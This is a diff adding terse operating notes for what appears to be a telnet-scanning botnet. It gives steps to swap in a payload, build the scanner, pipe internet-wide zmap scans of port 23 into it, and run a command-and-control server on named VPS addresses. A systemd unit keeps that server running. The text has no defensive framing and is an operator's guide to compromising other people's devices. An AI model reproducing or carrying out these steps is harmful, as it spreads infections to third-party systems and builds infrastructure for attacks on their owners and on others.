@@ -1,0 +1,39 @@
+1. Replace the payload in telnet.go with your payload
+2. Run "go build telnet.go"
+3. Start scanning with "ulimit -u999999; ulimit -n999999; zmap -p23 | ./telnet"
+
+
+my tutorial:
+1. start cnc:
+ssh -i averykey root@164.90.171.162
+on the vps:
+export TERM=xterm
+screen -e^Bb -S cnc
+./cnc
+then ctrl+b d
+
+later u can do:
+screen -r cnc
+
+
+2. run scanner:
+connect to ubuntu vps to start the scanner:
+ssh -i averykey root@164.92.131.53
+
+on the vps:
+ulimit -u999999; ulimit -n999999; zmap -p23 | ./telnet
+
+[Unit]
+Description=My 24/7 Exec Service
+After=network.target
+
+[Service]
+ExecStart=/root/cnc
+Restart=always
+User=root
+WorkingDirectory=/root
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
